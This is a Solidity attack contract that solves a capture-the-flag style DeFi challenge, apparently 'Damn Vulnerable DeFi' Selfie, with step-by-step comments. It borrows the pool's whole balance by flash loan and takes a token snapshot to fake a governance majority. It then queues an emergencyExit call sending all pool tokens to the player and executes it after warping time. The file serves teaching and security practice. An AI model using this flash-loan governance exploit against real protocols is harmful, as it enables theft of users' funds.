// SPDX-License-Identifier: MIT
pragma solidity =0.8.24;

// The player may not have access to the original contracts, so the
// player should use these interfaces.
import { ISimpleGovernance } from "./Interfaces/ISimpleGovernance.i.sol";
import { ISelfiePool } from "./Interfaces/ISelfiePool.i.sol";

import { DamnValuableTokenSnapshot } from "../DamnValuableTokenSnapshot.sol";
import { ISleepViaVMWarp } from "./Interfaces/ISleepViaVMWarp.i.sol";

contract OverthrowTheGovernment {
    address private player;
    DamnValuableTokenSnapshot private token;
    ISelfiePool private pool;
    ISimpleGovernance private governance;
    ISleepViaVMWarp private time; // so the function call is time.sleep()

    constructor(
        address _simpleGovernance,
        address _selfiePool,
        address _governanceToken,
        address _sleeper,
        address _player
    ) payable {
        token = DamnValuableTokenSnapshot(_governanceToken);
        pool = ISelfiePool(_selfiePool);
        governance = ISimpleGovernance(_simpleGovernance);
        time = ISleepViaVMWarp(_sleeper);
        player = _player;
    }

    // For the Foundry test to see if you've solved the challenge, your
    // contract is instantiated and then this function is run.
    function solveChallenge() public {
        // You may or may not need to add additional functions to this contract
        // in order to solve this challenge. You are free to modify this contract
        // however you want; it is your attack contract!

        // Once again, note that any funds or tokens should ultimately end up
        // in the player address in order to pass the challenge.

        /*//////////////////////////////////////////////////////////////
                                    SOLUTION
        //////////////////////////////////////////////////////////////*/

        // Like a previous challenge, the key vulnerability in this challenge
        // is the reliance on an ERC20 "snapshot" that does not take into
        // account the length of time a token was held, only the balance at
        // the time of the snapshot.

        // This allows us to take a large flash loan, create a snapshot,
        // and trick the governance contract into thinking we have many
        // governance tokens. (After all, the snapshot will prove it!)

        // After taking out the flash loan and creating a snapshot, we will
        // pass the governance's _hasEnoughVotes() check inside the queueAction()
        // function. This allows us to create an action proposal that will be
        // executed by the governance contract (after the delay time has passed).

        // Our goal is to steal all of the pool's tokens. Thankfully, the pool
        // has a function emergencyExit() which can be called by the governance
        // contract and will send all of the pool's tokens to an arbitrary
        // address. That function is locked behind an "onlyGovernance" modifier,
        // but since the governance contract will be executing our proposed
        // action, that modifier check will succeed.

        // Therefore, the "action" we propose is to call the pool address and
        // have the calldata be the emergencyExit() function with our address
        // as the input parameter.

        // After we propose the action, we repay the flash loan, and wait out
        // the clock!

        // 1. Take out a flash loan for all of the pool's funds:
        pool.flashLoan(address(this), address(token), token.balanceOf(address(pool)), "");

        // 2. The pool calls onFlashLoan() at our address, so we must create it
        //    below.

        // ...onFlashLoan()...

        // 7. Now that we have our action queued, we must wait the required
        //    amount of time.
        time.sleep(governance.getActionDelay());

        // 8. After the action delay time has elapsed, we can execute the
        //    action.
        uint256 actionId = governance.getActionCounter() - 1; // The counter has incremented, so we must find our action ID
        governance.executeAction(actionId);

        // Youtube walkthrough:
        // https://www.youtube.com/watch?v=_2RHyMMLR9A
    }

    function onFlashLoan(address, address, uint256, uint256, bytes memory) public returns (bytes32) {
        /*//////////////////////////////////////////////////////////////
                                    SOLUTION
        //////////////////////////////////////////////////////////////*/

        // 2. We have taken out the flash loan, which has called this function.
        //    We don't care about any of the input parameters so I haven't bothered
        //    to give them variable names. All that matters is that the function
        //    signature matches what the pool expects.

        // 3. Take a snapshot so that the most recent snapshot shows this
        //    contract having all the tokens
        token.snapshot();

        // 4. Call the governance contract to create an action, which it will
        //    do because it believes we have a majority of governance tokens.
        governance.queueAction(address(pool), 0, abi.encodeWithSignature("emergencyExit(address)", player));

        // 5. Approve the pool contract to reclaim the tokens after the flash
        //    loan, so that the transaction doesn't revert!
        token.approve(address(pool), token.balanceOf(address(this)));

        // 6. The flash loan contract requires returning this specific value
        //    as a check that our contract indeed expected the onFlashLoan()
        //    call and handled it sanely.
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    // The "payable" functionality and receive/fallback are provided for your
    // convenience. You are not required to use them and may remove them if you
    // want.
    receive() external payable { }
    fallback() external payable { }
}
